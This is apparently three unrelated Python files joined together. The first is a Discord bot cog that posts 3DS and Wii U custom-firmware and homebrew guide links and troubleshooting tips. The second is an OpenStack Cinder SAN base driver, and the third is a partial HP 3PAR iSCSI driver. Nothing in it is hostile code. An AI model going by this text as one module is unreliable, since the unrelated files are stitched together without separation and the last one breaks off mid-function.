        if (console == "wiiu" or console == "wii u") or (console == "auto" and "3ds" not in ctx.message.channel.name):
            embed = discord.Embed(title="Guide", color=discord.Color(0x009AC7))
            embed.set_author(name="FlimFlam69 & Plailect", url="https://wiiu.guide/")
            embed.set_thumbnail(url="http://i.imgur.com/CpF12I4.png")
            embed.url = "https://wiiu.guide/"
            embed.description = "FlimFlam69 and Plailect's Wii U custom firmware + coldboothax guide"
            await self.bot.say("", embed=embed)

    #Embed to Soundhax Download Website
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def soundhax(self):
        """Links to Soundhax Website"""
        embed = discord.Embed(title="Soundhax", color=discord.Color.blue())
        embed.set_author(name="Ned Williamson", url="http://soundhax.com/")
        embed.set_thumbnail(url="http://i.imgur.com/lYf0jan.png")
        embed.url = "http://soundhax.com"
        embed.description = "Free 3DS Primary Entrypoint <= 11.3"
        await self.bot.say("", embed=embed)

    # dsp dumper command
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def dsp(self):
        """Links to Dsp1."""
        embed = discord.Embed(title="Dsp1", color=discord.Color.green())
        embed.set_author(name="zoogie", url="https://github.com/zoogie", icon_url="https://gbatemp.net/data/avatars/l/357/357147.jpg?1426471484")
        embed.description = "Dump 3DS's DSP component to SD for homebrew audio."
        embed.set_thumbnail(url="https://raw.githubusercontent.com/Cruel/DspDump/master/icon.png")
        embed.url = "https://github.com/zoogie/DSP1/releases"
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def ntrstream(self):
        """Links to ntr streaming guide"""
        embed = discord.Embed(title="NTR Streaming Guide", color=discord.Color.blue())
        embed.url = "https://gbatemp.net/threads/tutorial-3ds-screen-recording-without-a-capture-card-ntr-cfw-method.423445/"
        embed.description = "How to use NTR CFW with Nitro Stream to Wirelessly Stream"
        embed.add_field(name="4 common fixes", value="• Are you connected to the Internet?\n• Is your antivirus program blocking the program?\n• Make sure you are not putting the port (:####) into the IP box of Nitro Stream.\n• Make sure you are on the latest preview for NTR 3.6.")
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def update(self):
        """Explains how to safely prepare for an update if you have boot9strap installed"""
        await self.simple_embed("If you have boot9strap and Luma3DS installed after following Plailect's guide, run Luma Updater to make sure it is on the latest Luma3DS normal version and then you can proceed to update your 3DS through system settings. \nNTR CFW works on the latest version.\n; Use this version of BootNTR: \n<https://github.com/Nanquitas/BootNTR/releases>\nNote: if there is a homebrew application that is no longer working, it may exist as a CIA that you can download under the TitleDB option in FBI.\n\n If you still have arm9loaderhax you can update to boot9strap following [this guide](https://3ds.guide/updating-to-boot9strap)")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def updateb9s(self):
        """Links to the guide for updating b9s versions"""
        embed = discord.Embed(title="Updating B9S Guide", color=discord.Color(0xCE181E))
        embed.set_author(name="Plailect", url="https://3ds.guide/updating-b9s")
        embed.set_thumbnail(url="https://3ds.guide/images/bio-photo.png")
        embed.url = "https://3ds.guide/updating-b9s"
        embed.description = "A guide for updating to new B9S versions."
        await self.bot.say("", embed=embed)

    @commands.command(aliases=["a9lhtob9s","updatea9lh"])
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def atob(self):
        """Links to the guide for updating from a9lh to b9s"""
        embed = discord.Embed(title="Upgrading a9lh to b9s", color=discord.Color(0xCE181E))
        embed.set_author(name="Plailect", url="https://3ds.guide/a9lh-to-b9s")
        embed.set_thumbnail(url="https://3ds.guide/images/bio-photo.png")
        embed.url = "https://3ds.guide/a9lh-to-b9s"
        embed.description = "A guide for upgrading your device from arm9loaderhax to boot9strap."
        await self.bot.say("", embed=embed)

    # Gateway h&s troubleshooting command
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def gwhs(self):
        """Links to gateway health and safety inject troubleshooting"""
        await self.bot.say("https://3ds.guide/troubleshooting#gw_fbi")

    # Hardmodder pastebin list
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def hmodders(self):
        """Links to approved hardmodder list"""
        await self.simple_embed("Don't want to hardmod yourself? Ask one of the installers on the server! <http://pastebin.com/wNr42PtH>")

    # Link to Astronautlevel's Luma3ds builds site
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def builds(self):
        """Links to astronautlevel's luma commit site."""
        await self.simple_embed("Astronautlevel's Luma3DS commit builds can be found here: https://astronautlevel2.github.io/Luma3DS \n(Warning: most builds here are meant for developers and are untested, use at your own risk!)")

    # Links to ctrtransfer guide
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def ctr(self):
        """Links to ctrtransfer guide"""
        embed = discord.Embed(title="Guide - ctrtransfer", color=discord.Color.orange())
        embed.set_author(name="Plailect", url="https://3ds.guide/")
        embed.set_thumbnail(url="https://3ds.guide/images/bio-photo.png")
        embed.url = "https://3ds.guide/ctrtransfer"
        embed.description = "How to do the 11.5.0-38 ctrtransfer"
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def s4sel(self):
        """Links to a tool for Smash 4 mods"""
        await self.simple_embed("To install mods for Smash, [Smash Selector](https://gbatemp.net/threads/release-smash-selector.431245/) is recommended. Instructions for use can be found on the page.")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def brick(self):
        """Warns about 2.1 dangers"""
        await self.simple_embed("While on 2.1, **NEVER** shut the N3DS lid, update any model, format a 2DS or attempt to play a game on a cartridge. Doing any of these things *will* brick your system.", color=discord.Color.red())

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def inoriquest(self):
        """Tells user to be descriptive"""
        await self.simple_embed("> Reminder: if you would like someone to help you, please be as descriptive as possible, of your situation, things you have done, as little as they may seem, aswell as assisting materials. Asking to ask wont expedite your process, and may delay assistance.")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def inoriwarn(self):
        """Warns users to keep the channels on-topic - Staff & Helper Declaration Only"""
        await self.simple_embed(" **Please keep the channels clean and on-topic, further derailing will result in intervention.  A staff or helper will be the quickest route to resolution; you can contact available staff by private messaging the Mod-mail bot.** A full list of staff and helpers can be found in #welcome-and-rules if you don't know who they are.")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def vguides(self):
        """Information about video guides relating to custom firmware"""
        embed = discord.Embed(title="Why you should not use video guides", color=discord.Color.dark_orange())
        embed.description = "\"Video guides\" for custom firmware and arm9loaderhax/boot9strap are not recommended for use. Their contents generally become outdated very quickly for them to be of any use, and they are harder to update unlike a written guide.\n\nWhen this happens, video guides become more complicated than current methods, having users do certain tasks which may not be required anymore.\n\nThere is also a risk of the uploader spreading misinformation or including potentially harmful files, sometimes unintentionally. Using other people's files to install arm9loaderhax can cause serious issues and even brick your system."
        embed.add_field(name="Recommended", value="The recommended thing to do is to use [Plailect's written complete guide for boot9strap](https://3ds.guide). It is the most up to date one and is recommended for everyone.")
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def vguides2(self):
        """Information about video guides relating to custom firmware"""
        await self.bot.say("https://www.youtube.com/watch?v=miVDKgInzyg")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def ip(self):
        """How to check your IP"""
        embed = discord.Embed(title="Check your 3DSs IP (CFW)", color=discord.Color.dark_orange())
        embed.description = "1. FBI\n2. Remote Install\n3. Recieve URLs over the network"
        embed.add_field(name="Check your 3DSs IP (Homebrew)", value="1. Open Homebrew Launcher\n2. Press Y")
        await self.bot.say("", embed=embed)

    @commands.command(aliases=["stock115","stock"])
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def stock114(self):
        """Advisory for consoles on stock 11.4+ firmware"""
        embed = discord.Embed(title="Running stock (unmodified) 11.4+ firmware?", color=discord.Color.dark_orange())
        embed.description = "You have 3 possible options for installing CFW:\n- [NTRBoot](https://3ds.guide/ntrboot) which needs a compatible DS flashcart and maybe an additional hacked 3DS or DS(i) console depending on the flashcart\n- [DSiWare](https://3ds.guide/installing-boot9strap-\(dsiware\)) which requires a hacked 3DS\n- [Hardmod](https://3ds.guide/installing-boot9strap-\(hardmod\)) which requires soldering **Not for beginners!**\n **Downgrading is impossible on 11.4+!**"                    
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def hbl(self):
        """Get homebrew launcher working on 11.4+ firmware"""
        await self.simple_embed("If you are looking for homebrew on your stock 11.4+ 3DS, you will need an entrypoint (like ninjhax, freakyhax, etc) for launching homebrew launcher")                    

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def readguide(self):
        """Read the guide please"""
        await self.simple_embed("Asking something that is on the guide will make everyone lose time, so please read and re-read the guide steps 2 or 3 times before coming here.", title="Please read the guide")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def bigsd(self):
        """SD bigger than 32GB"""
        await self.simple_embed("If you want to change your SD card to one bigger than 32GB then you'll have to format it to FAT32.\nYou can do this with the tool of your preference.\nFormatter examples:\n- [guiformat - Windows](http://www.ridgecrop.demon.co.uk/index.htm?guiformat.htm)\n- [gparted - Linux](http://gparted.org/download.php)", title="Big SD cards")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def sderrors(self):
        """Sd Error Guide"""
        await self.simple_embed("Guide For Checking SD Card For Errors\n- [H2testw Guide - Windows](https://3ds.guide/h2testw-(windows\))\n- [F3 Guide - Linux](https://3ds.guide/f3-(linux\))\n- [F3X Guide - Mac](https://3ds.guide/f3x-(mac\))", title="SD Card Errors")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def notbricked(self):
        """Missing boot.firm"""
        await self.simple_embed("If your power LED turns on and off after you installed b9s, you are not bricked and are just missing a file called boot.firm in the root of your SD card.\nTo fix this you should:\n1.Check you inserted the SD card in your console\n2.Place/replace the file, downloading it from https://github.com/AuroraWright/Luma3DS/releases\nChecking your SD for errors or corruption:\n\tWindows: https://3ds.guide/h2testw-(windows)#\n\tLinux: https://3ds.guide/f3-(linux)#\n\tMac: https://3ds.guide/f3x-(mac)#", title="No. You are not bricked")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def emureco(self):
        """Recommendation about EmuNAND"""
        await self.simple_embed("If you want to set up an EmuNAND the first thing to know is that you probably don't need it; if you don't know what an EmuNAND is, you don't need one.", title="EmuNAND Recommendation")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def failedupdate(self):
        """Notice about failed update on Wii U"""
        await self.simple_embed("A failed update in Download Management does not mean there is an update and the system is trying to download it. This means your blocking method (DNS etc.) is working and the system can't check for an update.", color=discord.Color(0x009AC7))

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def netinfo(self):
        """Network Maintenance Information / Operational Status"""
        await self.bot.say("https://www.nintendo.co.jp/netinfo/en_US/index.html")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def ctrmount(self):
        """Failed to mount CTRNAND error"""
        await self.simple_embed("While following the guide, after installing boot9strap, if you get an error that says \"Failed to mount CTRNAND\", just continue on with the guide.")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def emptysd(self):
        """What to do if you delete all your SD card contents"""
        await self.simple_embed("If you have lost the contents of your SD card with CFW, you will need in SD root:\n-Homebrew launcher executable [here](https://smealum.github.io/ninjhax2/boot.3dsx)\n-`boot.firm` from [luma3ds latest release 7z](https://github.com/AuroraWright/Luma3DS/releases/latest)\nThen repeat the [finalizing setup](https://3ds.guide/finalizing-setup) page.", color=discord.Color.red())

    # Embed to broken TWL Troubleshooting
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def twl(self):
        """Information on how to fix a broken TWL Partition"""
        embed = discord.Embed(title="Fix broken TWL", color=discord.Color(0xA2BAE0))
        embed.set_author(name="Plailect", url="https://3ds.guide/troubleshooting#twl_broken")                    
        embed.set_thumbnail(url="https://3ds.guide/images/bio-photo.png")
        embed.url = "https://3ds.guide/troubleshooting#twl_broken"                    
        embed.description = "Instructions on how to fix a broken TWL after doing the guide"
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def redscr(self):
        """Help with homebrew red screen"""
        await self.simple_embed("A red screen indicates that there is no boot.3dsx on root.\nIf you have a starter folder on root, place the contents of the starter folder on root.\nIf not, redownload the [Homebrew Starter Kit](https://smealum.github.io/ninjhax2/starter.zip) and place the contents of the starter folder inside the .zip on root.", title="If you get a red screen trying to open the Homebrew Launcher")

    # Intructions for deleting home menu Extdata
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def homext(self):
        """Deleting home menu extdata"""
        await self.simple_embed("1. Navigate to the following folder on your SD card: `/Nintendo 3DS/(32 Character ID)/(32 Character ID)/extdata/00000000/`\n2. Delete the corresponding folder for your region:\n  USA: `0000008f`\n   EUR: `00000098`\n   JPN: `00000082`\n   KOR: `000000A9`", title="How to clear Home Menu extdata")

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def deltheme(self):
        """Deleting home menu theme data"""
        await self.simple_embed("1. Navigate to the following folder on your SD card: `/Nintendo 3DS/(32 Character ID)/(32 Character ID)/extdata/00000000/`\n2. Delete the corresponding folder for your region:\n  USA: `000002cd`\n   EUR: `000002ce`\n   JPN: `000002cc`", title="How to delete Home Menu Theme Data")

    @commands.command(aliases=['godmode9'])
    async def gm9(self):
        """Links to the guide on GodMode9"""
        embed = discord.Embed(title="GodMode9 Usage", color=discord.Color(0x66FFFF))
        embed.set_author(name="Plailect", url="https://3ds.guide/godmode9-usage")
        embed.set_thumbnail(url="https://3ds.guide/images/bio-photo.png")
        embed.url = "https://3ds.guide/godmode9-usage"
        embed.description = "GodMode9 usage guide"
        await self.bot.say("", embed=embed)

    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def pminit(self):
        """Fix for the PM init failed error"""
        await self.simple_embed("If you are receiving a \"PM init failed\" error when attempting to launch safehax and are not on 11.3, use [this version of safehax.](https://github.com/TiniVi/safehax/releases/tag/r19)")

    # Embed to Apache Thunder's Flashcart Launcher
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def flashcart(self):
        """Launcher for old flashcarts"""
        embed = discord.Embed(title="Launcher for old flashcards (r4,m3,dstt,dsx,etc)", color=discord.Color(0x42f462))
        embed.set_author(name="Apache Thunder", url="https://gbatemp.net/threads/r4-stage2-twl-flashcart-launcher-and-perhaps-other-cards-soon%E2%84%A2.416434/")
        embed.set_thumbnail(url="https://gbatemp.net/data/avatars/m/105/105648.jpg")
        embed.url = "https://gbatemp.net/threads/r4-stage2-twl-flashcart-launcher-and-perhaps-other-cards-soon%E2%84%A2.416434/"
        embed.description = "Launcher for old flashcards"
        await self.bot.say("", embed=embed)

    # Embed to 3DS VC Injects Website
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def vc(self):
        """Link to Virtual Console Injects for 3DS"""
        embed = discord.Embed(title="Virtual Console Injects for 3DS", color=discord.Color.blue())
        embed.set_author(name="Asdolo", url="https://gbatemp.net/members/asdolo.389539/")
        embed.set_thumbnail(url="https://i.imgur.com/rHa76XM.png")
        embed.url = "https://gbatemp.net/search/40920047/?q=injector&t=post&o=date&g=1&c[title_only]=1&c[user][0]=389539"
        embed.description = "The recommended way to play old classics on your 3DS"
        await self.bot.say("", embed=embed)

    # Embed to ih8ih8sn0w's godmode9 guide
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def dump(self):
        """How to dump/build CIAs using GodMode9"""
        embed = discord.Embed(title="GodMode9 dump/build Guide", color=discord.Color(0x66FFFF))
        embed.set_author(name="ih8ih8sn0w", url="https://pastebin.com/sx8HYULr")
        embed.set_thumbnail(url="http://i.imgur.com/QEUfyrp.png")
        embed.url = "https://pastebin.com/sx8HYULr"
        embed.description = "How to dump/build CIAs using GodMode9"
        await self.bot.say("", embed=embed)
        
    # Embed to ih8ih8sn0w's layeredfs guide
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def layeredfs(self):
        """How to use Luma 8.0+ LayeredFs"""
        embed = discord.Embed(title="LayeredFs Guide", color=discord.Color(0x66FFFF))
        embed.set_author(name="ih8ih8sn0w", url="https://pastebin.com/sx8HYULr")
        embed.set_thumbnail(url="http://i.imgur.com/QEUfyrp.png")
        embed.url = "https://pastebin.com/QdzBv4Te"
        embed.description = "How to use Luma 8.0+ LayeredFs for ROM Hacking."
        await self.bot.say("", embed=embed)

    # Information about sighax
    @commands.command()
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def sighax(self):
        """Information about sighax"""
        embed = discord.Embed(title="Sighax Information", color=discord.Color(0x0000ff))
        embed.set_author(name="SciresM", url="https://www.reddit.com/r/3dshacks/comments/67f6as/psa_clearing_up_some_misconceptions_about_sighax/")
        embed.set_thumbnail(url="https://i.imgur.com/11ajkdJ.jpg")
        embed.url = "https://www.reddit.com/r/3dshacks/comments/67f6as/psa_clearing_up_some_misconceptions_about_sighax/"
        embed.description = "PSA About Sighax"
        await self.bot.say("", embed=embed)

    @commands.command(pass_context=True, name="7zip")
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def p7zip(self):
        """Download 7zip"""
        embed = discord.Embed(title="Download 7zip", color=discord.Color(0x0000ff))
        embed.set_thumbnail(url="http://i.imgur.com/cX1fuf6.png")
        embed.url = "http://www.7-zip.org/download.html"
        embed.description = "To be able to extract .7z files you need 7zip installed, get it here."
        await self.bot.say("", embed=embed)

def setup(bot):
    bot.add_cog(Assistance(bot))

# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
"""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help="SSH connection timeout in seconds"),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):                    
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="",
                        stderr="Error running SSH command",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def ensure_export(self, context, volume):
        """Synchronously recreates an export for a logical volume."""
        pass

    def create_export(self, context, volume):
        """Exports the volume."""
        pass

    def remove_export(self, context, volume):
        """Removes an export for a logical volume."""
        pass

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_("san_ip must be set"))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return "%s%s" % (self.configuration.iscsi_target_prefix,
                         volume['name'])


# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
"""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
"""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """Sanity check to ensure we have required options set."""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _("Invalid IP address format '%s'") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _("Found invalid iSCSI IP address(s) in configuration "
                    "option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'") % \
                   (", ".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """Clone an existing volume."""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

